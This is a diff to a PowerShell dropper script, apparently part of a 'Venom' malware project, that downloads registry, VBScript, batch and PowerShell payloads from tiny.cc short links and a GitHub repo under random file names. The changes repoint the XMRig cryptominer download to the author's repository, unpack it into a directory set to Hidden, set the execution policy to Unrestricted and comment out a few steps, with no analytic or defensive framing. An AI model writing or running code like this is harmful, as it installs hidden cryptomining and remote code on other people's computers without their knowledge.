@@ -63,7 +63,7 @@ cd $path
 
 Invoke-WebRequest -UseBasicParsing -OutFile "QyjAaZDBbNPk.reg" -Uri "http://tiny.cc/k5cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "FoRAUwtxKkSB.vbs" -Uri "http://tiny.cc/s5cg001"
-Invoke-WebRequest -UseBasicParsing -OutFile "w.bat" -Uri "http://tiny.cc/d6cg001"
+# Invoke-WebRequest -UseBasicParsing -OutFile "w.bat" -Uri "http://tiny.cc/d6cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "ZDaFvwjOosKx.vbs" -Uri "http://tiny.cc/y5cg001"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"
 
@@ -89,19 +89,22 @@ New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
-Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
+Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/xmrig-6.22.2-msvc-win64.zip"
+
+mkdir "$initial_dir\xmrig-6.22.2"
+
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir\xmrig-6.22.2"
 
 Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
-Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
-if (Test-Path -Path $newConfigPath) {
-    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "bat file has been replaced successfully."
-} else {
-    Write-Output "New bat file not found at the specified path."
-}
+# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
+# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+# if (Test-Path -Path $newConfigPath) {
+#     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+#     Write-Output "bat file has been replaced successfully."
+# } else {
+#     Write-Output "New bat file not found at the specified path."
+# }
 
 Remove-Item -Path "$initial_dir\ip.txt"
 
@@ -140,7 +143,7 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 
 Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 cd "$initial_dir\xmrig-6.22.2"
-Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
+# Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
 
 Start-Sleep -Seconds 340
 # Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
